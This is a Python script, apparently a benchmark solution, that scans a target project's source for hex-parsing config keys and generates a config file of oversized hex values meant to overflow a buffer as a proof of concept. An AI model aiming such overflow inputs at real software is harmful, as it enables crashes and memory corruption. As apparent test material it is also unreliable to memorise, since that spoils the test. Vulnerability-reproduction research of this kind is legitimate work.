import os
import re
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp()
        try:
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    tar.extractall(tmpdir)
            except tarfile.ReadError:
                # Fallback if src_path is not a tarball
                return self._generic_poc()

            hex_related_keys = set()

            for root, dirs, files in os.walk(tmpdir):
                for filename in files:
                    if not filename.endswith(
                        (
                            ".c",
                            ".h",
                            ".cpp",
                            ".cc",
                            ".cxx",
                            ".hpp",
                            ".hh",
                            ".hxx",
                            ".txt",
                            ".cfg",
                            ".conf",
                            ".ini",
                            ".md",
                            ".rst",
                        )
                    ):
                        continue
                    path = os.path.join(root, filename)
                    try:
                        with open(path, "r", errors="ignore") as f:
                            text = f.read()
                    except OSError:
                        continue

                    # Collect all string literals
                    str_matches = list(re.finditer(r'"([^"\\]|\\.)*"', text))
                    strings = [(m.start(), m.end(), m.group(0)[1:-1]) for m in str_matches]

                    # Heuristically find keys near isxdigit usage
                    if strings:
                        for m in re.finditer(r"isxdigit", text):
                            pos = m.start()
                            candidate = None
                            best_dist = 10**9
                            for s_start, s_end, content in strings:
                                if s_end <= pos:
                                    dist = pos - s_end
                                    if dist < best_dist:
                                        best_dist = dist
                                        candidate = content
                                else:
                                    break
                            if candidate is not None and best_dist <= 200:
                                if candidate and not any(ch in candidate for ch in "\n\r\t"):
                                    hex_related_keys.add(candidate.strip())

                    # Also collect any strings explicitly mentioning "hex"
                    for s_start, s_end, content in strings:
                        if "hex" in content.lower():
                            if content and not any(ch in content for ch in "\n\r\t"):
                                hex_related_keys.add(content.strip())

            return self._build_poc(hex_related_keys)
        finally:
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    def _build_poc(self, keys):
        header = "# autogenerated PoC config for hex handling\n"
        lines = [header, "[hex]\n"]

        # Use a length somewhat above the ground-truth to ensure overflow margin
        base_len = 600
        big_hex = "A" * base_len
        big_hex2 = "0123456789ABCDEF" * 40  # 640 hex chars

        # Generic long hex lines
        lines.append(big_hex + "\n")
        lines.append("0x" + big_hex + "\n")
        lines.append("0X" + big_hex + "\n")

        # Common key/value patterns
        lines.append("# hex with equals form\n")
        lines.append("hex=" + big_hex + "\n")
        lines.append("hex_value=" + big_hex2 + "\n")
        lines.append("color=0x" + big_hex + "\n")
        lines.append("id=" + big_hex2 + "\n")

        # Add lines using discovered keys near hex parsing code
        used = set()
        for raw_key in sorted(keys):
            key = raw_key.strip()
            if not key or key in used:
                continue
            used.add(key)
            safe_key = re.sub(r"\s+", "_", key)
            if len(safe_key) > 64:
                safe_key = safe_key[:64]
            lines.append(f"{safe_key}={big_hex2}\n")
            lines.append(f"{safe_key} 0x{big_hex}\n")

        body = "".join(lines)
        try:
            return body.encode("ascii", errors="ignore")
        except Exception:
            return self._generic_poc()

    def _generic_poc(self):
        base_len = 600
        big_hex = "A" * base_len
        big_hex2 = "0123456789ABCDEF" * 40
        lines = [
            "# generic hex PoC\n",
            "[hex]\n",
            big_hex + "\n",
            "0x" + big_hex + "\n",
            "hex=" + big_hex2 + "\n",
        ]
        return "".join(lines).encode("ascii", errors="ignore")